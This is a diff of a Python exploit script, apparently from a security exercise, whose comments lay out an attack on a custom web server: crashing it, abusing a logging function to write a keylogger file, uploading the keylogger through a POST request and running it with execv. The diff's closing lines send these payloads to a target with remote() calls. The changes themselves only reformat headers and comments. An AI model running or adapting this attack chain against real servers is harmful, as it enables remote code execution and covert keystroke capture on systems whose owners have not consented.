@@ -1,5 +1,5 @@
 '''
-[FINDINGS]
+### FINDINGS ###
 General flow:
 1) Sent request
 2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
@@ -34,7 +34,7 @@ To solve this issue, we can first create the file and write on the server using 
 Next we can do a POST request to the server to sent the keylogger data and put it in the keylogger file.
 Finally we can again sent a scenario 1 alike exploit and run the keylogger using execv.
 
-[EXPLOIT SUMMARY]
+### EXPLOIT SUMMARY ###
 1) Send crash payload
 2) Send log_message exploit to create keylogger file
 3) Send keylogger data using POST request
@@ -201,8 +201,7 @@ run_keylogger += b"\r\n\r\n"
 
 ### PERFORM ATTACK ###
 #remote("localhost", port).send(crash) # send crash payload
-# sleep(2) # let the server restart
-# Perform Attack
+# sleep(2) 
 remote(host, port).send(create_keylogger) # send attack payload
 sleep(2) 
 remote(host, port).send(post_keylogger) # send post payload
